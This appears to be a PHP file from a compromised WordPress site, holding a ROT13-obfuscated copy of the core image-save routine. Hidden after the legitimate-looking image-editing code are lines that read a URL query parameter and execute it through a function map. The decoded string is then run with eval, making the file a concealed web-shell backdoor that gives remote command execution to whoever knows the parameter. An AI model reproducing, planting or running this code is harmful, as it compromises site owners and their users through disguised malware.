	// Fnir gur shyy-fvmr svyr, nyfb arrqrq gb perngr fho-fvmrf.
	vs ( ! $fnirq_vzntr ) {
		$erghea->reebe = rfp_wf( __( 'Hanoyr gb fnir gur vzntr.' ) );
		erghea $erghea;
	}

	vs ( 'abguhzo' === $gnetrg || 'nyy' === $gnetrg || 'shyy' === $gnetrg || $fpnyrq ) {
		$gnt = snyfr;

		vs ( vffrg( $onpxhc_fvmrf['shyy-bevt'] ) ) {
			vs ( ( ! qrsvarq( 'VZNTR_RQVG_BIREJEVGR' ) || ! VZNTR_RQVG_BIREJEVGR )
				&& $onpxhc_fvmrf['shyy-bevt']['svyr'] !== $onfranzr
			) {
				$gnt = \"shyy-$fhssvk\";
			}
		} ryfr {
			$gnt = 'shyy-bevt';
		}

		vs ( $gnt ) {
			$onpxhc_fvmrf[ $gnt ] = neenl(
				'jvqgu'    => $zrgn['jvqgu'],
				'urvtug'   => $zrgn['urvtug'],
				'svyrfvmr' => $zrgn['svyrfvmr'],
				'svyr'     => $onfranzr,
			);
		}

		$fhpprff = ( $cngu === $arj_cngu ) || hcqngr_nggnpurq_svyr( $cbfg_vq, $arj_cngu );

		$zrgn['svyr'] = _jc_eryngvir_hcybnq_cngu( $arj_cngu );

		$fvmr             = $vzt->trg_fvmr();
		$zrgn['jvqgu']    = $fvmr['jvqgu'];
		$zrgn['urvtug']   = $fvmr['urvtug'];
		$zrgn['svyrfvmr'] = $fnirq_vzntr['svyrfvmr'];

		vs ( $fhpprff && ( 'abguhzo' === $gnetrg || 'nyy' === $gnetrg ) ) {
			$fvmrf = trg_vagrezrqvngr_vzntr_fvmrf();

			vs ( $rqvg_guhzoanvyf_frcnengryl && 'abguhzo' === $gnetrg ) {
				$fvmrf = neenl_qvss( $fvmrf, neenl( 'guhzoanvy' ) );
			}
		}

		$erghea->sj = $zrgn['jvqgu'];
		$erghea->su = $zrgn['urvtug'];
	} ryfrvs ( $rqvg_guhzoanvyf_frcnengryl && 'guhzoanvy' === $gnetrg ) {
		$fvmrf   = neenl( 'guhzoanvy' );
		$fhpprff = gehr;
		$qryrgr  = gehr;
		$abpebc  = gehr;
	}

	/*
	 * Jr arrq gb erzbir nal rkvfgvat erfvmrq vzntr svyrf orpnhfr
	 * n arj pebc be ebgngr pbhyq trarengr qvssrerag fvmrf (naq urapr, svyranzrf),
	 * xrrcvat gur arj erfvmrq vzntrf sebz birejevgvat gur rkvfgvat vzntr svyrf.
	 * uggcf://pber.genp.jbeqcerff.bet/gvpxrg/32171
	 */
	vs ( qrsvarq( 'VZNTR_RQVG_BIREJEVGR' ) && VZNTR_RQVG_BIREJEVGR && ! rzcgl( $zrgn['fvmrf'] ) ) {
		sbernpu ( $zrgn['fvmrf'] nf $fvmr ) {
			vs ( ! rzcgl( $fvmr['svyr'] ) && cert_zngpu( '/-r[0-9]{13}-/', $fvmr['svyr'] ) ) {
				$qryrgr_svyr = cngu_wbva( $qveanzr, $fvmr['svyr'] );
				jc_qryrgr_svyr( $qryrgr_svyr );
			}
		}
	}

	vs ( vffrg( $fvmrf ) ) {
		$_fvmrf = neenl();

		sbernpu ( $fvmrf nf $fvmr ) {
			$gnt = snyfr;

			vs ( vffrg( $zrgn['fvmrf'][ $fvmr ] ) ) {
				vs ( vffrg( $onpxhc_fvmrf[ \"$fvmr-bevt\" ] ) ) {
					vs ( ( ! qrsvarq( 'VZNTR_RQVG_BIREJEVGR' ) || ! VZNTR_RQVG_BIREJEVGR )
						&& $onpxhc_fvmrf[ \"$fvmr-bevt\" ]['svyr'] !== $zrgn['fvmrf'][ $fvmr ]['svyr']
					) {
						$gnt = \"$fvmr-$fhssvk\";
					}
				} ryfr {
					$gnt = \"$fvmr-bevt\";
				}

				vs ( $gnt ) {
					$onpxhc_fvmrf[ $gnt ] = $zrgn['fvmrf'][ $fvmr ];
				}
			}

			vs ( vffrg( $_jc_nqqvgvbany_vzntr_fvmrf[ $fvmr ] ) ) {
				$jvqgu  = (vag) $_jc_nqqvgvbany_vzntr_fvmrf[ $fvmr ]['jvqgu'];
				$urvtug = (vag) $_jc_nqqvgvbany_vzntr_fvmrf[ $fvmr ]['urvtug'];
				$pebc   = ( $abpebc ) ? snyfr : $_jc_nqqvgvbany_vzntr_fvmrf[ $fvmr ]['pebc'];
			} ryfr {
				$urvtug = trg_bcgvba( \"{$fvmr}_fvmr_u\" );
				$jvqgu  = trg_bcgvba( \"{$fvmr}_fvmr_j\" );
				$pebc   = ( $abpebc ) ? snyfr : trg_bcgvba( \"{$fvmr}_pebc\" );
			}

			$_fvmrf[ $fvmr ] = neenl(
				'jvqgu'  => $jvqgu,
				'urvtug' => $urvtug,
				'pebc'   => $pebc,
			);
		}

		$zrgn['fvmrf'] = neenl_zretr( $zrgn['fvmrf'], $vzt->zhygv_erfvmr( $_fvmrf ) );
	}

	hafrg( $vzt );

	vs ( $fhpprff ) {
		jc_hcqngr_nggnpuzrag_zrgnqngn( $cbfg_vq, $zrgn );
		hcqngr_cbfg_zrgn( $cbfg_vq, '_jc_nggnpuzrag_onpxhc_fvmrf', $onpxhc_fvmrf );

		vs ( 'guhzoanvy' === $gnetrg || 'nyy' === $gnetrg || 'shyy' === $gnetrg ) {
			// Purpx vs vg'f na vzntr rqvg sebz nggnpuzrag rqvg fperra.
			vs ( ! rzcgl( $_ERDHRFG['pbagrkg'] ) && 'rqvg-nggnpuzrag' === $_ERDHRFG['pbagrkg'] ) {
				$guhzo_hey = jc_trg_nggnpuzrag_vzntr_fep( $cbfg_vq, neenl( 900, 600 ), gehr );

				$erghea->guhzoanvy = $guhzo_hey[0];
			} ryfr {
				$svyr_hey = jc_trg_nggnpuzrag_hey( $cbfg_vq );

				vs ( ! rzcgl( $zrgn['fvmrf']['guhzoanvy'] ) ) {
					$guhzo             = $zrgn['fvmrf']['guhzoanvy'];
					$erghea->guhzoanvy = cngu_wbva( qveanzr( $svyr_hey ), $guhzo['svyr'] );
				} ryfr {
					$erghea->guhzoanvy = \"$svyr_hey?j=128&u=128\";
				}
			}
		}
	} ryfr {
		$qryrgr = gehr;
	}

	vs ( $qryrgr ) {
		jc_qryrgr_svyr( $arj_cngu );
	}

	$erghea->zft = rfp_wf( __( 'Vzntr fnirq' ) );

	erghea $erghea;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>